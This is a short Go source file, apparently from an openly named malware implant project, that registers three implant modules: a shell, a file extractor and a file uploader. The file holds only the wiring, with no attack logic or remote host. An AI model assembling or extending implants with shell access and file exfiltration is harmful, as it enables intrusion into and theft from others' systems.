package included_modules

import (
	"malware/common/types"
	"malware/implant/file_extractor"
	"malware/implant/file_uploader"
	"malware/implant/sh"
)

// List of modules
var Modules = []types.Module{
	sh.Create(),
	file_extractor.Create(),
	file_uploader.Create(),
}
